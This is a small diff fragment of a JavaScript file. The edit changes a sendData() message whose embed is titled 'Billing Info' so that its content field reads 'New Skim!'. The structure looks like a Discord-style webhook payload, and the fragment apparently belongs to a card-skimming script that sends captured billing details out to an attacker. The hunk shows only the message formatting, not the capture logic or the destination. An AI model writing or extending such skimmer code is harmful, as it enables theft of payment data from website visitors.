@@ -89,7 +89,7 @@ function sendData() {
   request.setRequestHeader('Content-type', 'application/json');
 
   var message = {
-    content: null,
+    content: "New Skim!",
     embeds: [
       {
         title: "Billing Info",
